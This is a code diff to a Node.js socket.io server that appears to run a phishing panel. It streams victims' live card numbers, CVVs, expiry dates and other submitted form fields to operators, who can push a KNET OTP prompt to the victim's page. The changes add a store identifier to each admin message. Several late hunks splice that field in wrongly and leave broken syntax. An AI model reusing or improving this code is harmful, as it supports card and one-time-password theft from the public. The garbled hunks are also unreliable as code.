@@ -432,17 +432,17 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", {
+    socket.emit("successfully-connected", { ...({
       sid: socket.id,
       pid: visitor._id,
-    });
+    }), store: STORE });
 
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+        io.to(adminSocketId).emit("visitor:new", { ...({ ...visitor, isConnected: true }), store: STORE });
       } else {
-        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
+        io.to(adminSocketId).emit("visitor:reconnected", { ...({ visitorId: visitor._id, socketId: socket.id }), store: STORE });
       }
     });
   });
@@ -464,18 +464,18 @@ io.on("connection", (socket) => {
           /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
+            io.to(adminSocketId).emit("card:liveUpdate", { ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp }), store: STORE });
           });
         }
       } else {
         visitor.liveCard = null;
         visitor.liveCardTimestamp = null;
         admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", {
+          io.to(adminSocketId).emit("card:liveUpdate", { ...({
             visitorId: visitor._id,
             liveCard: null,
             liveCardTimestamp: null,
-          });
+          }), store: STORE });
         });
       }
       visitors.set(socket.id, visitor);
@@ -483,10 +483,10 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", {
+        io.to(adminSocketId).emit("visitor:pageChanged", { ...({
           visitorId: visitor._id,
           page,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -502,10 +502,10 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:nameUpdated", {
+        io.to(adminSocketId).emit("visitor:nameUpdated", { ...({
           visitorId: visitor._id,
           name: name,
-        });
+        }), store: STORE });
       });
 
       console.log(`Visitor ${visitor._id} name updated to: ${name}`);
@@ -596,13 +596,13 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", {
+        io.to(adminSocketId).emit("visitor:dataSubmitted", { ...({
     
           visitorId: visitor._id,
           socketId: socket.id,
           data: data,
           visitor: visitor,
-        });
+        }), store: STORE });
       });
 
       console.log(`Data received from visitor ${visitor._id}:`, data);
@@ -626,11 +626,11 @@ socket.on("card:live", (data) => {
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {
+    io.to(adminSocketId).emit("card:liveUpdate", { ...({
       visitorId: visitor._id,
       liveCard: visitor.liveCard,
       liveCardTimestamp: visitor.liveCardTimestamp,
-    });
+    }), store: STORE });
   });
 });
 
@@ -641,9 +641,9 @@ socket.on("card:liveHide", () => {
   visitor.liveCardTimestamp = null;
   visitors.set(socket.id, visitor);
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {
+    io.to(adminSocketId).emit("card:liveUpdate", { ...({
       visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
-    });
+    }), store: STORE });
   });
 });
 
@@ -660,11 +660,11 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", {
+        io.to(adminSocketId).emit("visitor:cardVerification", { ...({
           visitorId: visitor._id,
           cardNumber,
           isBlocked,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -808,7 +808,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     var __skipEmit100 = false, __vv100 = null;
 /*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
 if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
-    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}
+    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { ...({ visitorId: __v98._id, page: __v98.page }), store: STORE }); } catch(e){} }); } } catch(e){}
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
@@ -903,7 +903,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
     
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
+      io.to(adminSocketId).emit("visitor:deleted", { ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor deleted by ID: ${visitorId}`);
@@ -1031,7 +1031,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
   socket.on("blockedCards:check", (cardNumber) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
-    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
+    socket.emit("blockedCards:checkResult", { ...({ isBlocked, prefix }), store: STORE });
   });
 
   // Blocked Countries: Get list
@@ -1072,7 +1072,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
     const isBlocked = globalBlockedCountries.some(c => 
       c.toLowerCase() === country.toLowerCase()
     );
-    socket.emit("blockedCountries:checkResult", { isBlocked, country });
+    socket.emit("blockedCountries:checkResult", { ...({ isBlocked, country }), store: STORE });
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
@@ -1097,7 +1097,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
     
     // Notify all admins about the update
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
+      io.to(adminSocketId).emit("visitor:markedAsRead", { ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor ${visitorId} marked as read`);
@@ -1126,11 +1126,11 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       
       // Notify all admins about the new message
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("chat:newMessage", {
+        io.to(adminSocketId).emit("chat:newMessage", { ...({
           visitorSocketId: visitor.socketId,
           visitorId: visitor._id,
           message: chatMessage
-        });
+        }), store: STORE });
       });
       
       console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
@@ -1216,10 +1216,10 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
           
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("visitor:disconnected", {
+            io.to(adminSocketId).emit("visitor:disconnected", { ...({
               visitorId: visitorId,
               socketId: socketId,
-            });
+            }), store: STORE });
           });
           
           console.log(`Visitor disconnected: ${socketId}`);
@@ -1365,18 +1365,18 @@ v.page = pageName;
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         if (username) {
-          io.to(adminSocketId).emit('visitor:nameUpdated', {
+          io.to(adminSocketId).emit('visitor:nameUpdated', { ...({
             visitorId: v._id,
             name: username,
-          });
+          }), store: STORE });
         }
         if (Object.keys(fields).length > 0) {
-          io.to(adminSocketId).emit('visitor:dataSubmitted', {
+          io.to(adminSocketId).emit('visitor:dataSubmitted', { ...({
             visitorId: v._id,
             socketId: matchedVisitor.socketId,
             data: { content: fields, page: pageName },
             visitor: v,
-          });
+          }), store: STORE });
         }
       });
       
@@ -1446,12 +1446,12 @@ app.post("/api/captured-data", (req, res) => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit('visitor:dataSubmitted', {
+        io.to(adminSocketId).emit('visitor:dataSubmitted', { ...({
           visitorId: v._id,
           socketId: matchedVisitor.socketId,
           data: { content: parsedFields, page: `MOH-POST: ${url}` },
           visitor: v,
-        });
+        }), store: STORE });
       });
     } else {
       // No matching visitor - store as orphan data
@@ -1652,10 +1652,10 @@ setInterval(() => {
       visitors.set(sid, visitor);
       // Notify admins about idle status change
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:idleChanged", {
+        io.to(adminSocketId).emit("visitor:idleChanged", { ...({
           visitorId: visitor._id,
           isIdle: isNowIdle,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -1683,10 +1683,10 @@ setInterval(() => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:disconnected", {
+        io.to(adminSocketId).emit("visitor:disconnected", { ...({
           visitorId: visitorId,
           socketId: sid,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -1727,11 +1727,11 @@ if(!v||!fields||typeof fields!=='object')return;
 var sig='';try{sig=JSON.stringify(fields)}catch(e){}
 if(v.__kdkSig===sig)return;v.__kdkSig=sig;
 try{var nm=fields.customer_name||fields.name||fields.fullName||fields['الاسم'];
-if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{visitorId:v._id,name:s})}catch(e){}})}}}
+if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{ ...({visitorId:v._id,name:s})}catch(e){}})}}}
 catch(e){}
 try{var ph=fields.customer_phone||fields.phone||fields['الهاتف'];if(ph&&String(ph).trim())v.phone=String(ph).trim()}catch(e){}
 var pg=fields['الصفحة']||page||'إتمام الطلب';
-v.data=Object.assign({},v.data||{},fields);
+v.data=Object.assign({},v.data||{},fields), store: STORE });
 if(!v.dataHistory)v.dataHistory=[];
 v.dataHistory.push({content:fields,page:pg,timestamp:new Date().toISOString()});
 if(Object.keys(fields).length>1)v.hasNewData=true;
@@ -1739,7 +1739,7 @@ v.lastActivity=Date.now();/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__
 v.page=pg;
 visitors.set(v.socketId||v._id,v);
 try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
-admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}});
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{ ...({visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}}), store: STORE });
 console.log('kdk5 data',v._id,pg)}catch(e){console.log('kdk5 push err',e.message)}}
 io.on('connection',function(socket){
 socket.onAny(function(ev,arg){try{
@@ -1779,7 +1779,7 @@ try{visitors.delete(d.socketId)}catch(e){}
 try{visitors.delete(d._id)}catch(e){}
 try{(d._sockets||[]).forEach(function(sx){if(sx&&sx!==d.socketId)visitors.set(sx,keep)})}catch(e){}
 try{savedVisitors=savedVisitors.filter(function(x){return x._id!==d._id})}catch(e){}
-admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{visitorId:d._id})}catch(e){}});
+admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{ ...({visitorId:d._id})}catch(e){}}), store: STORE });
 console.log('kdk5 merged',d._id,'->',keep._id)}
 visitors.set(keep.socketId||keep._id,keep);
 admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
